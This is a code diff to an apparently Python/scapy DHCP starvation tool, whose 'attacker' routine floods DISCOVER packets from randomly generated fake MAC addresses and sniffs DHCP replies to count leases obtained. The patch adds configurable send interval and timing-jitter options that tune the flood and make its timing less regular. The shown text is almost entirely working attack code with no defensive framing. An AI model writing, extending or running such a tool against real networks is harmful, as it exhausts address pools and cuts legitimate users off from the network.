@@ -10,6 +10,9 @@ requested = []
 sent = leases = 0
 running = True
 
+send_interval = 0.01
+send_jitter = 0
+
 def rand_mac():
     m=[0x00,0x0c,0x29, random.randint(0,255), random.randint(0,255), random.randint(0,255)]
     mac=':'.join(f"{x:02x}" for x in m); fake_macs.append(mac); return mac
@@ -65,7 +68,10 @@ def attacker():
         mac=rand_mac(); pkt,xid=make_discover(mac); xid_mac[xid]=mac
         sendp(pkt, iface=iface, verbose=0); sent+=1
         if not quiet and sent%10==0: print(f"[→] Sent {sent} DISCOVERs")
-        time.sleep(0.1)
+        # time.sleep(0.1)
+        base_t = send_interval
+        jitter = send_jitter * base_t
+        time.sleep(max(0.01, random.uniform(base_t - jitter, base_t + jitter)))
 
 def listener():
     sniff(filter="udp and (port 67 or port 68)", prn=handle, iface=iface, store=0,
@@ -82,9 +88,13 @@ def stats():
 
 def main():
     global iface, quiet, running
-    p=argparse.ArgumentParser(); p.add_argument("-i","--interface",default="eth0")
-    p.add_argument("-d","--duration",type=int); p.add_argument("-q","--quiet",action="store_true")
+    p=argparse.ArgumentParser(); p.add_argument("-i", "--interface",default="eth0")
+    p.add_argument("-d", "--duration",type=int); p.add_argument("-q","--quiet",action="store_true")
+    p.add_argument("-j", "--jitter", type=float, default=0.0, help="Adds randomness around DISCOVER interval (def=0, max=0.9)")
+    p.add_argument("-s", "--interval", type=float, default=0.1, help="Time in seconds between DISCOVERs (def=0.1s)")
+    global iface, quiet, running, send_interval, send_jitter
     args=p.parse_args(); iface=args.interface; quiet=args.quiet
+    send_interval=max(0.1, args.interval); send_jitter=max(0, min(0.9, args.jitter))
     if os.geteuid()!=0: print("Run as root"); sys.exit(1)
     t1=threading.Thread(target=listener,daemon=True); t1.start()
     t2=threading.Thread(target=attacker,daemon=True); t2.start()
